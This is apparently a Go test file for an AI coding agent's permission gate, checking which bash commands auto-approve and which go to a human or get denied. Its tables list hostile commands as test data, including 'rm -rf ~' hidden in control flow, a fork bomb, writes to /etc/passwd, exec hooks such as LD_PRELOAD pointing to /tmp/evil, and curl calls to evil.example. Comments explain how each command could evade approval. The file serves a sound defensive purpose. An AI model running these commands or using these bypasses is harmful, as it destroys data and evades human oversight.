package permissions

import (
	"context"
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ethanhinson/fuse/internal/config"
	"github.com/ethanhinson/fuse/internal/model"
)

// denyRecorder is an ApprovalFunc that records whether it was invoked and always
// denies, so a test can prove the human-approval path was (or was not) reached.
func newApproveRecorder(approved bool) (func(context.Context, ApprovalRequest) (bool, bool, error), *bool) {
	called := new(bool)
	fn := func(_ context.Context, _ ApprovalRequest) (bool, bool, error) {
		*called = true
		return approved, false, nil
	}
	return fn, called
}

// autoCfg builds an auto-mode PermissionsConfig with the given auto surface.
func autoCfg(auto config.AutoConfig, autoApprove, alwaysPrompt []string) config.PermissionsConfig {
	return config.PermissionsConfig{
		Mode:         "auto",
		AutoApprove:  autoApprove,
		AlwaysPrompt: alwaysPrompt,
		Auto:         auto,
	}
}

func bashArgs(cmd string) string {
	b, _ := json.Marshal(struct {
		Command string `json:"command"`
	}{Command: cmd})
	return string(b)
}

func TestAutoMode_SafeReadOnlyBash_AutoApproves(t *testing.T) {
	for _, cmd := range []string{"ls -la", "git log", "git status && git diff"} {
		approve, called := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if res.IsError {
			t.Fatalf("safe read-only %q should auto-approve, got error: %s", cmd, res.Output)
		}
		if *called {
			t.Fatalf("safe read-only %q must not invoke the approval func", cmd)
		}
	}
}

// TestAutoMode_InertEnvPrefix_AutoApproves is the end-to-end payoff of change
// 0070 D1: an env prefix whose name is on the proven-inert allowlist no longer
// stalls an otherwise auto-approvable read-only command on the human. (Review
// blocker 2 narrowed this from "any name not denylisted" to "a name we vouch
// for", so these are allowlisted names rather than an arbitrary FOO=1.)
func TestAutoMode_InertEnvPrefix_AutoApproves(t *testing.T) {
	for _, cmd := range []string{"CI=1 ls -la", "CGO_ENABLED=0 GOCACHE=/tmp/gc git log", "LC_ALL=C NO_COLOR=1 git log"} {
		approve, called := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if res.IsError {
			t.Fatalf("inert env prefix %q should auto-approve, got error: %s", cmd, res.Output)
		}
		if *called {
			t.Fatalf("inert env prefix %q must not invoke the approval func", cmd)
		}
	}
}

// TestAutoMode_PeeledWrappers_AutoApprove is the end-to-end payoff of change
// 0070 D2: a read-only command wrapped in timeout/env/nohup is classified on
// the inner command's own merits instead of stalling on the human.
func TestAutoMode_PeeledWrappers_AutoApprove(t *testing.T) {
	for _, cmd := range []string{
		"timeout 30 git log",
		"timeout -k 5 1.5s ls -la",
		"env CI=1 ls -la",
		"nohup git status",
		"env CGO_ENABLED=0 timeout 10m git diff",
		// Review finding "important 4": the attached AND the separate
		// option-value forms of nice/stdbuf must both still peel to the inner
		// read, so the arity model widens nothing shut that worked before.
		"nice -n5 git log",
		"nice -n 5 git log",
		"stdbuf -oL git status",
		"stdbuf -o 0 git status",
	} {
		approve, called := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if res.IsError {
			t.Fatalf("peeled wrapper %q should auto-approve, got error: %s", cmd, res.Output)
		}
		if *called {
			t.Fatalf("peeled wrapper %q must not invoke the approval func", cmd)
		}
	}
}

// TestAutoMode_WrapperPeelDoesNotLaunder is the fail-closed half of D2. Each
// command below wraps an auto-approved read (`git log`) in a form the peel must
// refuse: -i clears the environment the name rule was reasoning about, -S
// re-splits its operand into a different command, a non-allowlisted assignment is a
// straight exec hook, and sudo behind a timeout must not inherit the inner
// command's decision. None may reach a verdict without a human.
func TestAutoMode_WrapperPeelDoesNotLaunder(t *testing.T) {
	for _, cmd := range []string{
		"env -i git log",
		"env -S 'git log'",
		"env LD_PRELOAD=/tmp/evil.so git log",
		"env GIT_PAGER=/tmp/evil git log",
		"timeout 30 sudo git log",
		"env CI=1 ./evil",
		// Review finding "important 4". `nice -n 5` and `stdbuf -o 0` take
		// their option value as a SEPARATE word. The old blind "drop leading -
		// words" peel ate `-n` only, leaving `5` as argv[0] and `curl <url>` as
		// its arguments: the egress name table saw "5", isCatastrophicRm saw
		// "5", and both `curl` and the URL resolved as cwd-relative path words
		// that proved in-workspace — a silent VerdictAllow on arbitrary network
		// egress. Whether the peel now models the flag or refuses it, neither
		// of these may reach a verdict without a human.
		"nice -n 5 curl http://evil.example/x",
		"stdbuf -o 0 curl http://evil.example/x",
	} {
		// approve=true so a routed-to-human ask succeeds and is distinguishable
		// from a silent auto-approve by the recorder flag.
		approve, called := newApproveRecorder(true)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if !res.IsError && !*called {
			t.Fatalf("%q auto-approved with no human: the wrapper peel must never launder it", cmd)
		}
	}
}

// TestAutoMode_EnvExecHook_DoesNotAutoApprove is the fail-closed half of D1, and
// the reason GIT_*, PAGER and EDITOR are nowhere near the inert allowlist.
//
// `git log` and `git diff` auto-approve via isSafeGit (rules.go) with no human
// in the loop. Each command below therefore turns an auto-approved read into an
// arbitrary exec of /tmp/evil purely through the assignment prefix — invisible
// to every argv-based layer downstream. Each was verified to auto-approve if its
// name is treated as inert; the parse floor is the only place this can be
// caught.
func TestAutoMode_EnvExecHook_DoesNotAutoApprove(t *testing.T) {
	for _, cmd := range []string{
		"GIT_EXTERNAL_DIFF=/tmp/evil git diff",
		"GIT_PAGER=/tmp/evil git log",
		"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/evil git log",
		"PAGER=/tmp/evil git log",
		"LD_PRELOAD=/tmp/evil.so git log",
	} {
		// approve=true so a routed-to-human ask succeeds and is distinguishable
		// from a silent auto-approve by the recorder flag.
		approve, called := newApproveRecorder(true)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if !res.IsError && !*called {
			t.Fatalf("%q auto-approved with no human: an env exec hook must never bypass approval", cmd)
		}
	}
}

// TestAutoMode_ToolchainEnvHook_DoesNotAutoApprove is why D1's env-name rule is
// an ALLOWLIST rather than a denylist (review blocker 2).
//
// `make` and `go build ./...` both reach an allow verdict at the heuristic layer
// with no human in the loop. Every command below therefore turns one of those
// into an exec of an out-of-workspace binary purely through an assignment
// prefix — a build-toolchain hook that an enumerated denylist of "names that
// change what code runs" simply forgot. Each of these auto-approved while the
// rule was a denylist; under the allowlist an unrecognised name costs one
// prompt, which is the whole point of the inversion.
func TestAutoMode_ToolchainEnvHook_DoesNotAutoApprove(t *testing.T) {
	for _, cmd := range []string{
		"CC=/tmp/evil make",
		"CXX=/tmp/evil make",
		"GOFLAGS=-toolexec=/tmp/evil go build ./...",
		"GOROOT=/tmp/evil go build ./...",
		"CGO_LDFLAGS=-fuse-ld=/tmp/evil go build ./...",
		"MAKEFLAGS=-f/tmp/evil.mk make",
		// The same hole reached through D2's `env NAME=val` peel: both consumers
		// go through the one shared rule, so neither may drift open.
		"env CC=/tmp/evil make",
		"env GOFLAGS=-toolexec=/tmp/evil go build ./...",
		// An unrecognised name is unproven, not benign.
		"SOME_UNKNOWN_HOOK=/tmp/evil make",
	} {
		// approve=true so a routed-to-human ask succeeds and is distinguishable
		// from a silent auto-approve by the recorder flag.
		approve, called := newApproveRecorder(true)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if !res.IsError && !*called {
			t.Fatalf("%q auto-approved with no human: an unproven env name must never bypass approval", cmd)
		}
	}
}

// TestAutoMode_ControlFlowDescent_SurfacesHiddenPayload is the end-to-end
// security half of change 0070 D3.
//
// Before D3, a dangerous command wrapped in control flow was protected only by
// accident: the whole statement hit collectStmt's default: arm, and
// "unparseable ⇒ ask" put a human in front of it. D3 removes that accident for
// if/for/while/case/block/subshell, so the protection must now come from the
// segments themselves reaching the rules layer. If the descent ever dropped a
// branch — descending `Then` but not `Else`, the loop body but not a nested
// clause, the first case item but not the rest — the payload would vanish and
// the residual read-only segments would AUTO-APPROVE with no human at all.
// That is a silent fail-open, strictly worse than the fail-closed it replaced.
//
// Asserting a terminal deny (IsError && !called) rather than merely "not
// auto-approved" is what makes this test load-bearing: an ask would also
// satisfy "not auto-approved" while telling us nothing about whether the
// segment was seen. Each row therefore proves the hidden `rm -rf ~` was
// actually enumerated out of that branch.
func TestAutoMode_ControlFlowDescent_SurfacesHiddenPayload(t *testing.T) {
	for _, cmd := range []string{
		"if true; then rm -rf ~; fi",
		"if false; then ls; else rm -rf ~; fi",
		"if false; then ls; elif true; then rm -rf ~; fi",
		"for f in a b; do rm -rf ~; done",
		"while true; do rm -rf ~; done",
		"until false; do rm -rf ~; done",
		"case foo in a) ls ;; b) rm -rf ~ ;; esac",
		"{ ls; rm -rf ~; }",
		"(cd /tmp && rm -rf ~)",
		"ls & rm -rf ~",
		"if true; then for f in a b; do rm -rf ~; done; fi",
	} {
		// approve=true so an ask would look like success — only a genuine
		// terminal deny distinguishes "the payload was seen and refused".
		approve, called := newApproveRecorder(true)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if !res.IsError {
			t.Fatalf("%q: control-flow descent must surface the hidden rm -rf to the rules layer, got: %s", cmd, res.Output)
		}
		if *called {
			t.Fatalf("%q: a rules-layer deny must not route to the human approval func", cmd)
		}
	}
}

// TestAutoMode_FunctionDeclaration_StaysClosed pins the one node D3
// deliberately did NOT descend. A function body does not run where it is
// declared, so enumerating its segments would misreport what executes; the fork
// bomb is the canonical case. These must reach a human, never auto-approve.
func TestAutoMode_FunctionDeclaration_StaysClosed(t *testing.T) {
	for _, cmd := range []string{
		":(){ :|:& };:",
		"f() { rm -rf /; }",
		"function f { ls; }",
	} {
		approve, called := newApproveRecorder(true)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
			WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
		if !res.IsError && !*called {
			t.Fatalf("%q auto-approved with no human: a function declaration must stay fail-closed", cmd)
		}
	}
}

func TestAutoMode_DenySegment_DeniesWithLayerNamedReason(t *testing.T) {
	approve, called := newApproveRecorder(true)
	// An allow rule for bash:git * means rules would allow git status, but the
	// rm -rf segment is dangerous ⇒ terminal deny at the rules layer.
	g := New(autoCfg(config.AutoConfig{}, []string{"bash:git *"}, nil), newTestRegistry("bash"), approve,
		WithWorkspaceRoot(t.TempDir()))
	res := g.Execute(context.Background(), "bash", bashArgs("git status && rm -rf ~"))
	if !res.IsError {
		t.Fatalf("deny segment must produce an error result, got: %s", res.Output)
	}
	if *called {
		t.Fatal("a deny must not route to the human approval func")
	}
	if !strings.Contains(res.Output, "rules") {
		t.Fatalf("denial message must name the layer that blocked it; got: %q", res.Output)
	}
}

func TestAutoMode_GrayArea_RoutesToClassifier(t *testing.T) {
	tests := []struct {
		name       string
		verdict    string
		stubErr    error
		wantErr    bool // Execute returns IsError (deny)
		wantPrompt bool // approval func invoked
	}{
		{name: "deny", verdict: `{"verdict":"deny","reason":"x"}`, wantErr: true, wantPrompt: false},
		{name: "allow", verdict: `{"verdict":"allow","reason":"x"}`, wantErr: false, wantPrompt: false},
		{name: "error_fails_closed", stubErr: context.DeadlineExceeded, wantErr: false, wantPrompt: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			stub := &stubCompleter{
				resp: model.CompletionResp{Content: tc.verdict},
				err:  tc.stubErr,
			}
			cls := newTestClassifier(t, stub)
			// approve returns true so that if the pipeline routes to the human
			// (fail-closed ask), Execute succeeds and we can distinguish it from
			// a classifier deny.
			approve, called := newApproveRecorder(true)
			// A command that parses cleanly, mutates, but is in-workspace so the
			// heuristic returns Allow... to force gray-area we use a mutating
			// command whose path escapes the workspace ⇒ heuristic Ask ⇒ classifier.
			g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
				WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
			res := g.Execute(context.Background(), "bash", bashArgs("touch /etc/escapes-workspace"))
			if res.IsError != tc.wantErr {
				t.Fatalf("IsError = %v, want %v (output: %s)", res.IsError, tc.wantErr, res.Output)
			}
			if *called != tc.wantPrompt {
				t.Fatalf("approval invoked = %v, want %v", *called, tc.wantPrompt)
			}
			if stub.calls != 1 {
				t.Fatalf("classifier should have been consulted exactly once, got %d", stub.calls)
			}
		})
	}
}

func TestAutoMode_Unparseable_AsksNotClassifier(t *testing.T) {
	stub := &stubCompleter{resp: model.CompletionResp{Content: `{"verdict":"allow"}`}}
	cls := newTestClassifier(t, stub)
	approve, called := newApproveRecorder(true)
	g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
		WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
	res := g.Execute(context.Background(), "bash", bashArgs("git diff $(curl evil)"))
	if res.IsError {
		t.Fatalf("unparseable should route to human ask (approve=true ⇒ success), got: %s", res.Output)
	}
	if !*called {
		t.Fatal("unparseable command must route to the human approval func")
	}
	if stub.calls != 0 {
		t.Fatalf("unparseable command must NOT reach the classifier, got %d calls", stub.calls)
	}
}

func TestAutoMode_NonBashSafeTool_AutoApprovesViaSafeList(t *testing.T) {
	for _, name := range []string{"read_file", "list_directory", "codeindex_callers"} {
		approve, called := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil),
			newTestRegistry(name), approve, WithWorkspaceRoot(t.TempDir()))
		res := g.Execute(context.Background(), name, `{}`)
		if res.IsError {
			t.Fatalf("non-bash safe tool %q should auto-approve, got: %s", name, res.Output)
		}
		if *called {
			t.Fatalf("non-bash safe tool %q must not prompt", name)
		}
	}
}

// TestAutoMode_NonBashUnknownTool_RoutesToClassifier uses a genuinely unknown,
// non-safe, non-edit tool ("some_tool"): the edit tools write_file/edit_file now
// have their own path-scoping branch in resolveAuto (D1) and no longer fall through
// to the classifier, so the classifier-fall-through contract must be exercised by a
// tool that is neither safe-listed nor an edit tool.
func TestAutoMode_NonBashUnknownTool_RoutesToClassifier(t *testing.T) {
	stub := &stubCompleter{resp: model.CompletionResp{Content: `{"verdict":"deny","reason":"x"}`}}
	cls := newTestClassifier(t, stub)
	approve, called := newApproveRecorder(true)
	g := New(autoCfg(config.AutoConfig{}, nil, nil),
		newTestRegistry("some_tool"), approve, WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))
	res := g.Execute(context.Background(), "some_tool", `{"path":"x"}`)
	if !res.IsError {
		t.Fatalf("non-bash unknown tool with classifier deny should deny, got: %s", res.Output)
	}
	if *called {
		t.Fatal("classifier deny must not route to human")
	}
	if stub.calls != 1 {
		t.Fatalf("non-bash unknown tool must route to classifier once, got %d", stub.calls)
	}
	// command passed to classifier is the raw args (not split).
	if !strings.Contains(stub.lastReq.Messages[len(stub.lastReq.Messages)-1].Content, `{"path":"x"}`) {
		t.Errorf("classifier should receive the raw args as command; got %q",
			stub.lastReq.Messages[len(stub.lastReq.Messages)-1].Content)
	}
}

// TestAutoMode_NonBashUnknownTool_NoClassifier_Asks guards the fail-closed ask for
// the residual gray area (an unknown, non-edit tool with no classifier wired).
// See the sibling test above for why write_file is no longer a valid stand-in.
func TestAutoMode_NonBashUnknownTool_NoClassifier_Asks(t *testing.T) {
	approve, called := newApproveRecorder(true)
	g := New(autoCfg(config.AutoConfig{}, nil, nil),
		newTestRegistry("some_tool"), approve, WithWorkspaceRoot(t.TempDir()))
	res := g.Execute(context.Background(), "some_tool", `{"path":"x"}`)
	if res.IsError {
		t.Fatalf("no classifier should fall closed to human ask (approve=true), got: %s", res.Output)
	}
	if !*called {
		t.Fatal("residual gray area with no classifier must ask")
	}
}

func TestAutoMode_CloneForChild_PreservesModeAndClassifier(t *testing.T) {
	stub := &stubCompleter{resp: model.CompletionResp{Content: `{"verdict":"deny","reason":"x"}`}}
	cls := newTestClassifier(t, stub)
	approve, parentCalled := newApproveRecorder(true)
	parent := New(autoCfg(config.AutoConfig{}, nil, nil),
		newTestRegistry("bash"), approve, WithWorkspaceRoot(t.TempDir()), WithClassifier(cls))

	child := parent.CloneForChild("worker")

	// Child auto-approves the same safe read-only command (mode carried).
	res := child.Execute(context.Background(), "bash", bashArgs("ls -la"))
	if res.IsError {
		t.Fatalf("child should auto-approve safe read-only command; got: %s", res.Output)
	}
	if *parentCalled {
		t.Fatal("safe command must not prompt in child")
	}

	// Child's verdict cache is independent from parent: prime the child cache,
	// then confirm the parent has not gained the entry.
	child.Execute(context.Background(), "bash", bashArgs("touch /etc/escapes"))
	if stub.calls == 0 {
		t.Fatal("child should have consulted the (shared-client) classifier")
	}
	childCalls := stub.calls
	// Parent runs the same gray-area command: since the parent's verdict cache is
	// independent, it must consult the classifier again (calls increments).
	parent.Execute(context.Background(), "bash", bashArgs("touch /etc/escapes"))
	if stub.calls == childCalls {
		t.Fatal("parent verdict cache must be independent from child (expected a fresh classifier call)")
	}
}

// TestAutoMode_RedirectWriteTargets_EndToEnd is change 0070 D4's payoff and its
// safety proof in one table, driven through resolveAuto with no classifier
// wired. Before D4 every one of these rows failed closed at LayerParse.
//
// The LAYER assertion is as load-bearing as the verdict: `echo x > /etc/passwd`
// allowing at LayerSafelist is precisely the fail-open this task exists to
// prevent — a read-only `echo` waved through with a write to a system file
// hanging off it, at a layer that has no root set to catch it. Requiring the
// allows to come from LayerHeuristic proves the redirected commands really do
// fall through to the layer that can scope them.
func TestAutoMode_RedirectWriteTargets_EndToEnd(t *testing.T) {
	cases := []struct {
		desc      string
		cmd       string
		want      Verdict
		wantLayer string
	}{
		{"build output into the workspace allows at the scoping layer", "go build > out.log", VerdictAllow, LayerHeuristic},
		{"read-only command with an in-root target allows at the scoping layer", "ls -la > listing.txt", VerdictAllow, LayerHeuristic},
		{"append inside the workspace allows", "git log >> history.txt", VerdictAllow, LayerHeuristic},
		{"echo into /etc/passwd never auto-approves", "echo pwned > /etc/passwd", VerdictAsk, LayerClassifier},
		{"echo into a home dotfile never auto-approves", "echo x >> ~/.zshrc", VerdictAsk, LayerClassifier},
		{"a redirect out of the workspace inside an if branch never auto-approves", "if true; then echo x > /etc/passwd; fi", VerdictAsk, LayerClassifier},
		{"a redirect out of the workspace inside a bash -c never auto-approves", `bash -c "echo x > /etc/passwd"`, VerdictAsk, LayerClassifier},
		// The 0037 benign shapes keep their safelist short-circuit: they carry no
		// write target at all, so nothing needs scoping.
		{"a /dev/null sink still short-circuits on the safelist", "wc -l x 2>/dev/null | tail -5", VerdictAllow, LayerSafelist},
		{"an fd-dup still short-circuits on the safelist", "git status 2>&1", VerdictAllow, LayerSafelist},
		// A target we cannot name is still refused at the parse floor.
		{"a variable target still fails closed at the parse floor", "echo x > $F", VerdictAsk, LayerParse},
		{"a read-write redirect still fails closed at the parse floor", "cat <> scratch", VerdictAsk, LayerParse},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			root := t.TempDir()
			canon, err := filepath.EvalSymlinks(root)
			if err != nil {
				t.Fatal(err)
			}
			restore := chdir(t, canon)
			defer restore()
			g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), AlwaysApprove,
				WithWorkspaceRoot(canon))
			got, layer, _, _ := g.resolveAuto(context.Background(), "bash", bashArgs(tc.cmd))
			if got != tc.want {
				t.Errorf("resolveAuto(%q) = %v, want %v", tc.cmd, got, tc.want)
			}
			if layer != tc.wantLayer {
				t.Errorf("resolveAuto(%q) layer = %q, want %q", tc.cmd, layer, tc.wantLayer)
			}
		})
	}
}

// TestAutoMode_OpaqueArgs_EndToEnd is change 0070 D5 seen from the gate: the
// widening it buys, and the ask it must never trade away for it.
//
// The workspace root is the cwd for every row, so any layer that resolved an
// opaque token as a relative path would prove containment against this very
// root and ALLOW. A row asserting VerdictAsk here is therefore asserting that
// nothing did.
func TestAutoMode_OpaqueArgs_EndToEnd(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		// autoApprove is the user's configured allow-pattern list for the row.
		// Empty for every row that predates the pattern-allow rows at the bottom.
		autoApprove []string
		want        Verdict
		// wantLayer, when non-empty, additionally pins WHICH layer decided. It is
		// what makes an allow row about the pattern path non-vacuous: `git status`
		// would auto-approve at LayerSafelist whether or not the pattern matched.
		wantLayer string
	}{
		// The widening: opaque args in read-only commands stop stalling.
		{desc: "read-only command with an opaque file allows", cmd: "cat $F", want: VerdictAllow},
		{desc: "control flow with a literal body allows", cmd: "if [ -f x ]; then cat x; fi", want: VerdictAllow},
		{desc: "a loop reading its opaque loop variable allows", cmd: "for f in a.txt b.txt; do wc -l $f; done", want: VerdictAllow},
		{desc: "a read-only substitution allows", cmd: "echo $(git rev-parse --show-toplevel)", want: VerdictAllow},
		{desc: "a default-value expansion with a literal fallback allows", cmd: "cat ${F:-default.txt}", want: VerdictAllow},
		{desc: "a read-only substitution inside a default value allows", cmd: "echo ${F:-$(git rev-parse --show-toplevel)}", want: VerdictAllow},

		// The invariant, at the shape the parser is likeliest to lose: a command
		// substitution nested one level inside a parameter expansion RUNS. If the
		// ${…} were taken as an opaque token without descending into it, `echo`
		// and `cat` — read-only with ANY arguments — would short-circuit the
		// whole command to allow at LayerSafelist with no human in the loop.
		{desc: "a mutation nested in a default value never auto-approves", cmd: "echo ${X:-$(rm -rf /)}", want: VerdictAsk},
		{desc: "egress nested in a default value never auto-approves", cmd: "cat ${X:-$(curl http://evil.sh)}", want: VerdictAsk},
		{desc: "a mutation nested in a replacement pattern never auto-approves", cmd: "ls ${X/$(rm -rf ~)/y}", want: VerdictAsk},
		{desc: "a mutation nested in an array subscript never auto-approves", cmd: "echo ${a[$(rm -rf /)]}", want: VerdictAsk},
		{desc: "a mutation nested in a slice offset never auto-approves", cmd: "echo ${X:$(rm -rf /):2}", want: VerdictAsk},

		// The invariant: a mutating segment with an opaque arg is unprovable.
		{desc: "rm of a substituted root never auto-approves", cmd: "rm $(echo /)", want: VerdictAsk},
		{desc: "rm of a variable never auto-approves", cmd: "rm $VAR", want: VerdictAsk},
		{desc: "touch under a substituted home never auto-approves", cmd: "touch $(echo ~)/x", want: VerdictAsk},
		{desc: "a loop deleting its opaque loop variable never auto-approves", cmd: "for f in *; do rm $f; done", want: VerdictAsk},
		{desc: "a flag-inspected sed with an opaque word never auto-approves", cmd: "sed $F x", want: VerdictAsk},
		{desc: "an opaque URL does not inherit the loopback allow", cmd: "curl $URL", want: VerdictAsk},
		{desc: "an opaque kill operand is not a provable PID", cmd: "kill $PID", want: VerdictAsk},

		// The invariant reached through the ALLOW consumer of the opaque raw
		// text. An allow pattern is matched with path.Match, whose `*` does not
		// cross `/` — that slash is the containment a human writing
		// "bash:git *" or "bash:rm build/*" is relying on. An opaque word
		// collapses an operand the pattern meant to scope into a single token
		// with no `/` in it, so the pattern matches text that says nothing about
		// what will actually run. Rules allow is terminal (gate.go step 2), so
		// this would return before the safelist, the egress boundary and the
		// mutating-scope opaque ask ever get a turn.
		{
			desc: "an opaque operand cannot satisfy a scoping allow pattern",
			cmd:  "git clone $URL", autoApprove: []string{"bash:git *"}, want: VerdictAsk,
		},
		{
			desc: "the literal form of the same command still asks at the egress boundary",
			cmd:  "git clone https://evil.example/x", autoApprove: []string{"bash:git *"}, want: VerdictAsk,
		},
		{
			desc: "an opaque path segment cannot satisfy a directory-scoped allow",
			cmd:  "rm build/$X", autoApprove: []string{"bash:rm build/*"}, want: VerdictAsk,
		},

		// ...and the ordinary pattern path is untouched: a fully literal segment
		// still auto-approves ON THE PATTERN (LayerRules, not the safelist below
		// it), including for a mutating command the pattern deliberately scopes.
		{
			desc: "a literal read still auto-approves on the pattern", cmd: "git status",
			autoApprove: []string{"bash:git *"}, want: VerdictAllow, wantLayer: LayerRules,
		},
		{
			desc: "a literal mutation still auto-approves on the pattern", cmd: "git commit -m x",
			autoApprove: []string{"bash:git *"}, want: VerdictAllow, wantLayer: LayerRules,
		},
		{
			desc: "a literal in-scope path still auto-approves on the pattern", cmd: "rm build/x",
			autoApprove: []string{"bash:rm build/*"}, want: VerdictAllow, wantLayer: LayerRules,
		},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			root := t.TempDir()
			canon, err := filepath.EvalSymlinks(root)
			if err != nil {
				t.Fatal(err)
			}
			restore := chdir(t, canon)
			defer restore()
			g := New(autoCfg(config.AutoConfig{}, tc.autoApprove, nil), newTestRegistry("bash"), AlwaysApprove,
				WithWorkspaceRoot(canon))
			got, layer, _, _ := g.resolveAuto(context.Background(), "bash", bashArgs(tc.cmd))
			if got != tc.want {
				t.Errorf("resolveAuto(%q) = %v (layer %q), want %v", tc.cmd, got, layer, tc.want)
			}
			if tc.wantLayer != "" && layer != tc.wantLayer {
				t.Errorf("resolveAuto(%q) decided at layer %q, want %q", tc.cmd, layer, tc.wantLayer)
			}
		})
	}
}
